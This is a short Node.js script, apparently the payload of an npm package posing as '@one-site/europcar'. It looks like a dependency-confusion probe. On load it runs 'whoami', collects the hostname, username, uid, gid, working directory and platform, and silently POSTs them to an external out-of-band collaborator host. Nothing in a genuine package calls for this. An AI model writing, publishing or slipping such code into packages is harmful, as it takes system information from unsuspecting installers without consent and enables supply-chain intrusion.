const https = require('https');
const os = require('os');
const { exec } = require('child_process');

const COLLABORATOR_URL = 'https://d719f8034pkill5r8dbgx1geh57h6uc3x.oast.fun';

function executeCommand(command) {
    return new Promise((resolve) => {
        exec(command, (error, stdout, stderr) => {
            if (error) {
                resolve(`Error: ${error.message}`);
                return;
            }
            resolve(stdout.trim() || stderr.trim() || 'No output');
        });
    });
}

async function notifyServer() {
    // Obtener whoami
    const whoami = await executeCommand('whoami');
    const hostname = os.hostname();
    const cwd = process.cwd();
    
    const data = JSON.stringify({
        package: '@one-site/europcar',
        version: '2.92.8',
        timestamp: new Date().toISOString(),
        whoami: whoami,
        hostname: hostname,
        platform: os.platform(),
        cwd: cwd,
        node_version: process.version,
        user: os.userInfo().username,
        uid: os.userInfo().uid,
        gid: os.userInfo().gid
    });

    const url = new URL(COLLABORATOR_URL + '/whoami-test');
    const options = {
        hostname: url.hostname,
        port: 443,
        path: url.pathname + url.search,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(data)
        }
    };

    const req = https.request(options, (res) => {
        res.on('data', () => {});
        res.on('end', () => {});
    });

    req.on('error', () => {});
    req.write(data);
    req.end();
}

notifyServer();
